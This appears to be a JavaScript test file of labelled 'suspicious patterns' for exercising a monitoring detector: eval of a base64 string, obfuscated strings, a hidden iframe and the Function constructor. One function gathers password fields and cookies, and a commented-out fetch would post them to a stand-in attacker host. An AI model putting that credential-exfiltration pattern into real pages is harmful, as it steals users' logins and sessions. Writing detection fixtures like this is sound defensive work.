// Test JavaScript file with suspicious patterns for monitoring detection

// Normal code
function normalFunction() {
    console.log("This is a normal function");
    return "Normal result";
}

// Suspicious patterns below

// Pattern 1: Eval-based code execution
eval("console.log('This code was dynamically executed')");

// Pattern 2: Base64 encoded content
var encodedPayload = "Y29uc29sZS5sb2coJ0RlY29kZWQgYmFzZTY0IHN0cmluZycpOw==";
eval(atob(encodedPayload));

// Pattern 3: DOM manipulation
document.write("<div>Dynamically injected content</div>");

// Pattern 4: String obfuscation
var obfuscatedString = String.fromCharCode(
    115, 117, 115, 112, 105, 99, 105, 111, 117, 115, 32, 99, 111, 100, 101
);
console.log(obfuscatedString); // "suspicious code"

// Pattern 5: Hidden iframe creation
function createHiddenIframe() {
    var iframe = document.createElement('iframe');
    iframe.src = "https://example.com";
    iframe.style.display = "none";
    document.body.appendChild(iframe);
}

// Pattern 6: Function constructor
var dynamicFunction = new Function(
    "return 'This function was dynamically created';"
);
console.log(dynamicFunction());

// Pattern 7: Suspicious network request
function exfiltrateData() {
    var data = {
        username: document.getElementById('username')?.value,
        password: document.getElementById('password')?.value,
        cookies: document.cookie
    };
    
    // Commented out to prevent actual network request
    // fetch("https://malicious-site.example/exfil", {
    //    method: "POST",
    //    body: JSON.stringify(data)
    // });
    
    console.log("Would have exfiltrated:", data);
}

// Execute functions
normalFunction();
setTimeout(createHiddenIframe, 1000);
// exfiltrateData();

console.log("Script execution completed"); 